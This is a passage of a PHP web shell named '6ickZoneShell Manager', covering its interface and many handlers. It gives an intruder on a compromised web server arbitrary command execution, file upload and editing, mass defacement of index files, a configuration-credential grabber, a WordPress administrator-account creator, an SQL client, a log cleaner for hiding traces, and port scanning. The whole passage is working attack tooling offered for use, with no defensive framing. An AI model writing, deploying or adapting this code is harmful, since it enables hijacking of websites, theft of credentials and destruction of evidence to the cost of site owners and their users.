        margin: 0 5px;
    }
    .main-menu a {
        font-size: 0.9em;
        margin: 0 5px;
    }
    input, select, textarea {
        font-size: 0.9em;
        padding: 4px;
    }
    input[type="submit"] {
        width: auto !important;
        height: auto !important;
        padding: 4px 8px !important;
        font-size: 0.9em !important;
    }
    .file-actions select { width: 80px !important; }
    .file-actions input[type="submit"] { width: 25px !important; }
    textarea { height: 400px !important; font-size: 0.7em !important; }
    .create-form input[type="text"], .create-form select { width: calc(100% - 20px); }
    .create-form input[type="submit"] { width: 100%; }
    .sql-result-table { font-size: 0.8em; }
    .sql-result-table th, .sql-result-table td { padding: 6px; }
}

</style>
</head>
<body>
<center>
<a href="?"><h1 style="font-family: Kelly Slab; font-size: 35px; color: white;">
<?php echo $title; ?> </h1></a>

<?php
// Display messages
if (!empty($msg_text)) {
    echo "<div class='message {$msg_type}'>{$msg_text}</div>";
}

// --- DISPLAY FEATURE OUTPUTS ---
// Handler to clear feature output when Home or Clear button is clicked
// This handler must be BEFORE the feature_output-box display
if (isset($_GET['clear_output']) && $_GET['clear_output'] === 'true') {
    unset($_SESSION['feature_output']);
    // Redirect to clear clear_output param from URL
    $current_url_base = strtok($_SERVER["REQUEST_URI"], '?');
    $query_params = $_GET;
    unset($query_params['clear_output']);
    $new_query_string = http_build_query($query_params);
    header("Location: {$current_url_base}?" . $new_query_string);
    exit();
}

if (isset($_SESSION['feature_output']) && !empty($_SESSION['feature_output'])) {
    echo '<div class="feature-output-box">';
    echo '<h4>Feature Output <a href="?path='.urlencode($path).'&clear_output=true" class="clear-btn">Clear</a>:</h4>'; // Added Clear button
    echo '<pre>' . $_SESSION['feature_output'] . '</pre>'; // Pre-formatted output
    echo '</div>';
}
?>

<table class="system-info-table" width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>
<font color='white'><i class='fa fa-user'></i> User / IP </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $_SERVER['REMOTE_ADDR']; ?></font>
<tr><td><font color='white'><i class='fa fa-desktop'></i> Host / Server </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></font>
<tr><td><font color='white'><i class='fa fa-hdd-o'></i> System </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo php_uname(); ?></font>
</tr></td></table>

<div class="main-menu">
    <a href="?action=Home" onclick="return confirm('6ickZoneShell Manager\nby 0x6ick x Nyx6st\nMass deface tools by Indoxploit\nUse WP Login from GitHub\nBlog: 0x6ick.my.id / 0x6ickblogspot.com\nGitHub: github.com/6ickzone\n© 2025 - 6ickwhispers@gmail.com\nAfter you know this, will you go home?');">Home</a> | <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=mass_deface_form">Mass Deface</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=create_form">Create</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=encoder_decoder_form">Encode/Decode</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=config_grabber_form">Config Grabber</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=wp_admin_form">WP Admin</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=sql_client_form">SQL Client</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=log_cleaner_form">Log Cleaner</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=ping_form">Ping</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=portscan_form">Port Scan</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=dns_lookup_form">DNS Lookup</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=whois_form">Whois</a>
</div>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 900px; margin: 15px auto;">

<div class="path-nav">
    <i class="fa fa-folder-o"></i> :
    <?php
    $paths_array = explode('/', trim($path, '/'));
    echo '<a href="?path=/">/</a>'; // Link to root (Linux)
    $current_built_path = '';
    foreach($paths_array as $id=>$pat){
        if(empty($pat)) continue;
        $current_built_path .= '/' . $pat;
        echo '<a href="?path='.urlencode($current_built_path).'">'.$pat.'</a>/';
    }
    ?>
</div>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 900px; margin: 15px auto;">

<?php
// --- MAIN SECTIONS (Forms and output) ---
// These sections will display specific forms or command outputs
// If none of these specific actions are requested, the file list will show

$show_file_list = true; // Flag to control file list display

if (isset($_GET['action'])) {
    $current_action = $_GET['action'];

    switch ($current_action) {
        case 'cmd':
            $show_file_list = false;
            echo '<div class="section-box">';
            echo "<h3>Execute Command</h3>";
            echo "<form method='POST'>";
            echo " <input type='text' name='cmd_input' placeholder='whoami or ls -la' style='width: calc(100% - 70px); height:30px; margin-right: 5px;'>";
            echo " <input type='submit' name='do_cmd' value='>>' style='width:60px; height:30px;'/>";
            echo "</form>";
            if(isset($_POST['do_cmd'])) {
                $cmd_output = exe($_POST['cmd_input']);
                echo "<pre>".htmlspecialchars($cmd_output)."</pre>";
            }
            echo '</div>';
            break;
        case 'upload_form':
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>Upload File</h3>';
            echo '<form enctype="multipart/form-data" method="POST">
            <input type="file" name="file_upload" style="color:<?php echo $theme_fg; ?>;border:2px solid <?php echo $theme_fg; ?>;" required/>
            <input type="submit" value="UPLOAD" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15px;background:black;color: <?php echo $theme_fg; ?>;border:2px solid <?php echo $theme_fg; ?>;border-radius:5px"/>
            </form>';
            echo '</div>';
            break;
        case 'mass_deface_form':
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>Mass Deface</h3>';
            if (!empty($mass_deface_results)) {
                echo "<h4>Mass Deface Results:</h4>";
                echo "<pre>".$mass_deface_results."</pre>";
            }
            echo "<form method='post'>
            <font style='text-decoration: underline;'>Tipe Mass:</font><br>
            <input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br><br>
            <font style='text-decoration: underline;'>Folder:</font><br>
            <input type='text' name='d_dir' value='".htmlspecialchars($path)."' style='width: 90%; height:10px;'><br>
            <font style='text-decoration: underline;'>Filename:</font><br>
            <input type='text' name='d_file' value='index.html' style='width: 90%; height:10px;'><br>
            <font style='text-decoration: underline;'>Index File:</font><br>
            <textarea name='script_content' style='width: 90%; height: 200px;'>Hacked By 6ickZone</textarea><br>
            <input type='submit' name='start_mass_deface' value='YameroOo!' style='width: 100%;'>
            </form>";
            echo '</div>';
            break;
        case 'create_form':
            $show_file_list = false;
            echo '<div class="section-box create-form">';
            echo '<h3>Create New File / Folder</h3>';
            echo '<form method="POST" action="?create_new=true&path='.urlencode($path).'">
            Create: <select name="create_type" style="width:120px; height:30px;"><option value="file">File</option><option value="dir">Folder</option></select><br><br>
            Name: <input type="text" name="create_name" required style="width: calc(100% - 100px); height:30px;"><br><br>
            <input type="submit" value="Create" style="width:100px; height:30px;">
            <a href="?path='.urlencode($path).'" style="margin-left:10px;">Cancel</a>
            </form>';
            echo '</div>';
            break;
        case 'encoder_decoder_form':
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>Encoder / Decoder</h3>';
            // Output handled by general display block above
            echo '<form method="POST">
            <textarea name="encode_decode_text" placeholder="Enter text here..." style="width: 100%; height: 150px;"></textarea><br><br>
            <select name="encode_decode_action" style="width: 150px; height:30px;">
                <option value="base64_encode">Base64 Encode</option>
                <option value="base64_decode">Base64 Decode</option>
                <option value="url_encode">URL Encode</option>
                <option value="url_decode">URL Decode</option>
                <option value="md5">MD5 Hash</option>
                <option value="sha1">SHA1 Hash</option>
                <option value="str_reverse">String Reverse</option>
            </select>
            <input type="submit" name="encode_decode_submit" value="Process" style="width:100px; height:30px; margin-left:10px;">
            </form>';
            echo '</div>';
            break;
        case 'config_grabber_form':
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>Config Grabber</h3>';
            // Output handled by general display block above
            echo '<form method="POST">
            <input type="submit" name="start_config_grab" value="Start Config Grab" style="width:100%;">
            </form>';
            echo '</div>';
            break;
        case 'wp_admin_form':
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>WordPress Admin Creator</h3>';
            // Output handled by general display block above
            echo '<form method="POST">
            WordPress Root Path (e.g., /home/user/public_html/wordpress):<br>
            <input type="text" name="wp_root_path" value="'.htmlspecialchars($path).'" style="width: 100%;"><br><br>
            New Username:<br>
            <input type="text" name="wp_username" required style="width: 100%;"><br><br>
            New Password:<br>
            <input type="password" name="wp_password" required style="width: 100%;"><br><br>
            New Email:<br>
            <input type="email" name="wp_email" required style="width: 100%;"><br><br>
            <input type="submit" name="wp_admin_submit" value="Create WP Admin" style="width: 100%;">
            </form>';
            echo '</div>';
            break;
        case 'sql_client_form':
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>SQL Client</h3>';
            // Output handled by general display block above
            echo '<form method="POST">
            DB Host (e.g., localhost):<br>
            <input type="text" name="db_host" value="localhost" style="width: 100%;"><br><br>
            DB User:<br>
            <input type="text" name="db_user" required style="width: 100%;"><br><br>
            DB Pass:<br>
            <input type="password" name="db_pass" style="width: 100%;"><br><br>
            DB Name:<br>
            <input type="text" name="db_name" style="width: 100%;"><br><br>
            SQL Query:<br>
            <textarea name="sql_query" placeholder="SELECT * FROM users LIMIT 10;" style="width: 100%; height: 150px;"></textarea><br><br>
            <input type="submit" name="sql_client_submit" value="Execute SQL" style="width: 100%;">
            </form>';
            echo '</div>';
            break;
        case 'log_cleaner_form':
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>Log Cleaner</h3>';
            // Output handled by general display block above
            echo '<form method="POST">
            <p><strong>Peringatan:</strong> Membersihkan log bisa menghapus jejak penting. Gunakan dengan sangat hati-hati!</p><br>
            <input type="submit" name="clean_logs_submit" value="Bersihkan Log (Linux Umum)" style="width: 100%;">
            </form>';
            echo '</div>';
            break;
        case 'ping_form': // New: Ping Tool Form
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>Ping Tool</h3>';
            echo '<form method="POST">
            Host/IP Target:<br>
            <input type="text" name="ping_target" required placeholder="google.com" style="width: 100%;"><br><br>
            Jumlah Ping (opsional, max 10):<br>
            <input type="number" name="ping_count" value="4" min="1" max="10" style="width: 100px;"><br><br>
            <input type="submit" name="ping_submit" value="Ping" style="width: 100%;">
            </form>'; // Changed name to ping_submit
            if(isset($_POST['ping_submit'])) { // Handle POST here directly
                $target_host = $_POST['ping_target'];
                $ping_count = intval($_POST['ping_count']);
                if ($ping_count <= 0 || $ping_count > 10) $ping_count = 4;
                $ping_cmd = "ping -c {$ping_count} " . escapeshellarg($target_host);
                $ping_output = exe($ping_cmd);
                echo "<pre>".htmlspecialchars($ping_output)."</pre>";
            }
            echo '</div>';
            break;
        case 'portscan_form': // New: Port Scanner Form
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>Port Scanner</h3>';
            echo '<form method="POST">
            Host/IP Target:<br>
            <input type="text" name="portscan_target" required placeholder="google.com" style="width: 100%;"><br><br>
            Port(s) (e.g., 80,443,21-23):<br>
            <input type="text" name="ports_to_scan" required placeholder="80,443,22" style="width: 100%;"><br><br>
            <input type="submit" name="portscan_submit" value="Scan Ports" style="width: 100%;">
            </form>'; // Changed name to portscan_submit
            if(isset($_POST['portscan_submit'])) { // Handle POST here directly
                $target_host = $_POST['portscan_target'];
                $ports_to_scan = $_POST['ports_to_scan'];
                $scan_output = "";
                if (function_exists('exec') || function_exists('shell_exec')) {
                    if (trim(exe('which nmap')) !== '') {
                        $scan_cmd = "nmap -p " . escapeshellarg($ports_to_scan) . " " . escapeshellarg($target_host);
                        $scan_output = exe($scan_cmd);
                    } elseif (trim(exe('which nc')) !== '') {
                        $ports_array = explode(',', $ports_to_scan);
                        foreach ($ports_array as $port_range) {
                            if (strpos($port_range, '-') !== false) {
                                list($start_port, $end_port) = explode('-', $port_range);
                                for ($p = (int)$start_port; $p <= (int)$end_port; $p++) {
                                    $nc_cmd = "nc -zvn " . escapeshellarg($target_host) . " " . escapeshellarg($p) . " 2>&1";
                                    $scan_output .= exe($nc_cmd) . "\n";
                                }
                            } else {
                                $nc_cmd = "nc -zvn " . escapeshellarg($target_host) . " " . escapeshellarg($port_range) . " 2>&1";
                                $scan_output .= exe($nc_cmd) . "\n";
                            }
                        }
                        $scan_output = "Nmap not found, using Netcat. Output might be verbose:\n" . $scan_output;
                    } else { $scan_output = "Error: Nmap or Netcat not found on server."; }
                } else { $scan_output = "Error: Command execution functions are disabled."; }
                echo "<pre>".htmlspecialchars($scan_output)."</pre>";
            }
            echo '</div>';
            break;
        case 'dns_lookup_form': // New: DNS Lookup Form
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>DNS Lookup</h3>';
            echo '<form method="POST">
            Domain Target:<br>
            <input type="text" name="dns_lookup_target" required placeholder="google.com" style="width: 100%;"><br><br>
            Record Type:<br>
            <select name="dns_record_type" style="width: 150px; height:30px;">
                <option value="A">A (Address)</option>
                <option value="MX">MX (Mail Exchange)</option>
                <option value="NS">NS (Name Server)</option>
                <option value="TXT">TXT (Text)</option>
                <option value="CNAME">CNAME (Canonical Name)</option>
                <option value="ANY">ANY (All Records)</option>
            </select><br><br>
            <input type="submit" name="dns_lookup_submit" value="Lookup DNS" style="width: 100%;">
            </form>'; // Changed name to dns_lookup_submit
            if(isset($_POST['dns_lookup_submit'])) { // Handle POST here directly
                $target_domain = $_POST['dns_lookup_target'];
                $record_type = $_POST['dns_record_type'];
                $dns_output = "";
                if (trim(exe('which dig')) !== '') {
                    $dns_cmd = "dig " . escapeshellarg($target_domain) . " " . escapeshellarg($record_type);
                    $dns_output = exe($dns_cmd);
                } elseif (trim(exe('which nslookup')) !== '') {
                    $dns_cmd = "nslookup -type=" . escapeshellarg($record_type) . " " . escapeshellarg($target_domain);
                    $dns_output = exe($dns_cmd);
                } else { $dns_output = "Error: dig or nslookup not found on server."; }
                echo "<pre>".htmlspecialchars($dns_output)."</pre>";
            }
            echo '</div>';
            break;
        case 'whois_form': // New: Whois Form
            $show_file_list = false;
            echo '<div class="section-box">';
            echo '<h3>Whois Lookup</h3>';
            echo '<form method="POST">
            Domain Target:<br>
            <input type="text" name="whois_target" required placeholder="google.com" style="width: 100%;"><br><br>
            <input type="submit" name="whois_submit" value="Whois" style="width: 100%;">
            </form>'; // Changed name to whois_submit
            if(isset($_POST['whois_submit'])) { // Handle POST here directly
                $target_domain = $_POST['whois_target'];
                $whois_output = "";
                if (trim(exe('which whois')) !== '') {
                    $whois_cmd = "whois " . escapeshellarg($target_domain);
                    $whois_output = exe($whois_cmd);
                } else { $whois_output = "Error: whois command not found on server."; }
                echo "<pre>".htmlspecialchars($whois_output)."</pre>";
            }
            echo '</div>';
            break;
        case 'download_file': // This action is removed by user's request.
            $show_file_list = false; // Tetap set false agar tidak kembali ke file listing
            echo '<div class="section-box">';
            echo '<p style="color:red; text-align:center;">Fitur Download Dinonaktifkan.</p>';
            echo '<p><a href="?path='.urlencode($path).'">Kembali ke Explorer</a></p>';
            echo '</div>';
            break;
        case 'delete': // New: Delete handler using GET
            // !!! PENTING: FITUR DELETE DIHILANGKAN DARI SHELL INI ATAS PERMINTAAN USER !!!
            $show_file_list = false; // Tetap set false agar tidak kembali ke file listing
            echo '<div class="section-box">';
            echo '<p style="color:red; text-align:center;">Fitur Delete Dinonaktifkan.</p>';
            echo '<p><a href="?path='.urlencode($path).'">Kembali ke Explorer</a></p>';
            echo '</div>';
            break;
        case 'view_file':
            $show_file_list = false;
            $file_to_view = $_GET['target_file'];
            echo '<div class="section-box">';
            echo "<h3>Viewing: ".htmlspecialchars(basename($file_to_view))."</h3>";
            if (is_file($file_to_view) && is_readable($file_to_view)) {
                echo('<textarea style="font-size: 12px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 600px;" readonly>'.htmlspecialchars(@file_get_contents($file_to_view)).'</textarea>');
            } else {
                echo '<p style="color:red; text-align:center;">File not found or not readable!</p>';
            }
            echo '<p><a href="?path='.urlencode($path).'">Back to Explorer</a></p>';
            echo '</div>';
            break;
        case 'edit_form':
            $show_file_list = false;
            $file_to_edit = $_GET['target_file'];
            echo '<div class="section-box">';
            echo "<h3>Editing: ".htmlspecialchars(basename($file_to_edit))."</h3>";
            if (is_file($file_to_edit) && is_readable($file_to_edit)) {
                echo '<form method="POST" action="?option=true&path='.urlencode($path).'">
                <textarea name="src_content" style="font-size: 12px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 600px;">'.htmlspecialchars(@file_get_contents($file_to_edit)).'</textarea><br />
                <input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'">
                <input type="hidden" name="opt_action" value="edit_save">
                <input type="submit" value="SAVE" style="height:30px; width:70px;"/>
                <a href="?path='.urlencode($path).'" style="margin-left:10px;">CANCEL</a>
                </form>';
            } else {
                echo '<p style="color:red; text-align:center;">File not found or not readable for editing!</p>';
                echo '<p><a href="?path='.urlencode($path).'">Back to Explorer</a></p>';
            }
            echo '</div>';
            break;
        case 'rename_form':
            $show_file_list = false;
            $file_to_rename = $_GET['target_file'];
            echo '<div class="section-box">';
            echo "<h3>Rename: ".htmlspecialchars(basename($file_to_rename))."</h3>";
            echo '<form method="POST" action="?option=true&path='.urlencode($path).'">
            New Name : <input name="new_name_value" type="text" size="25" style="width: calc(100% - 100px); height:30px;" value="'.htmlspecialchars(basename($file_to_rename)).'" /><br><br>
            <input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'">
            <input type="hidden" name="opt_action" value="rename_save">
            <input type="submit" value="RENAME" style="height:30px; width:100px;"/>
            <a href="?path='.urlencode($path).'" style="margin-left:10px;">CANCEL</a>
            </form>';
            echo '</div>';
            break;
        case 'chmod_form':
            $show_file_list = false;
            $file_to_chmod = $_GET['target_file'];
            echo '<div class="section-box">';
            echo "<h3>Chmod: ".htmlspecialchars(basename($file_to_chmod))."</h3>";
            $current_perms = file_exists($file_to_chmod) ? substr(sprintf('%o', @fileperms($file_to_chmod)), -4) : '0000';
            echo '<form method="POST" action="?option=true&path='.urlencode($path).'">
            Permission : <input name="perm_value" type="text" size="4" value="'.$current_perms.'" style="width:80px; height: 30px;"/><br><br>
            <input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'">
            <input type="hidden" name="opt_action" value="chmod_save">
            <input type="submit" value="CHMOD" style="width:100px; height:30px;"/>
            <a href="?path='.urlencode($path).'" style="margin-left:10px;">CANCEL</a>
            </form>';
            echo '</div>';
            break;
    }
}
// File List Table (Only displayed if no specific action form is active)
if ($show_file_list) {
    $scandir_items = @scandir($path);
    if ($scandir_items === false) {
        echo "<center><font color='red'>Failed to read directory: " . htmlspecialchars($path) . "</font></center>";
        $scandir_items = [];
    }

    echo '<div id="content"><table width="95%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
    <th><center>Name</center></th>
    <th><center>Size</center></th>
    <th><center>Perm</center></th>
    <th><center>Options</center></th>
    </tr>';

    usort($scandir_items, function($a, $b) use ($path) {
        $pathA = $path . '/' . $a;
        $pathB = $path . '/' . $b;
        
        $is_dir_A = is_dir($pathA);
        $is_dir_B = is_dir($pathB);

        if ($is_dir_A && !$is_dir_B) return -1;
        if (!$is_dir_A && $is_dir_B) return 1;
        
        return strcasecmp($a, $b);
    });

    foreach($scandir_items as $item){
        if($item == '.') continue; // Skip . (current directory)

        $full_item_path = $path.'/'.$item;
        $display_name = htmlspecialchars($item);
        $encoded_full_item_path = urlencode($full_item_path);
        
        echo "<tr>
        <td class=td_home>";
        if($item == '..') { // Up one folder
            $parent_dir = dirname($path);
            echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".urlencode($parent_dir)."\"> $display_name</a></td>";
        } elseif(is_dir($full_item_path)) {
            echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\"> $display_name</a></td>";
        } else {
            echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".urlencode($path)."\"> $display_name</a></td>";
        }
        
        echo "<td class=td_home><center>";
        echo (is_file($full_item_path) ? round(filesize($full_item_path)/1024,3).' KB' : '--');
        echo "</center></td>";

        echo "<td class=td_home><center>";
        if(file_exists($full_item_path)) {
            $perms_str = perms($full_item_path);
            if(is_writable($full_item_path)) echo '<font color="#57FF00">'; // Writable is green
            elseif(!is_readable($full_item_path)) echo '<font color="#FF0004">'; // Non-readable is red
            echo $perms_str;
            if(is_writable($full_item_path) || !is_readable($full_item_path)) echo '</font>'; 
        } else {
            echo '????';
        }
        echo "</center></td>";

        echo "<td class=td_home><center>
        <form method=\"POST\" action=\"?option=true&path=".urlencode($path)."\">
        <select name=\"opt_action\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:<?php echo $theme_fg; ?>;border:2px solid <?php echo $theme_fg; ?>;border-radius:5px\" onchange=\"";
        // DELETE action removed from here
        echo "if(this.value === 'view_file' || this.value === 'edit_form' || this.value === 'rename_form' || this.value === 'chmod_form') { window.location.href = '?action=' + this.value + '&target_file=' + '$encoded_full_item_path' + '&path=' + '".urlencode($path)."'; }"; // These are GET requests for forms
        echo "else if(this.value !== 'Action') { this.form.submit(); }"; // Submit POST requests for remaining actions (delete is gone)
        echo "else { this.value = ''; }";
        echo "\">
        <option value=\"Action\">Action</option>";
        // Delete option removed
        if(is_file($full_item_path)) {
            echo "<option value=\"edit_form\">Edit</option>";
            // Download option removed
        }
        echo "<option value=\"rename_form\">Rename</option>
        <option value=\"chmod_form\">Chmod</option>
        </select>";
        echo "</form>
        </center></td>
        </tr>";
    }
    echo '</table></div>';
}
?>

</center>
<br><br>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 900px; margin: 15px auto;">
<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#ff4da6"> <?php echo $author; ?> </font></b></center>
</body>
</html>
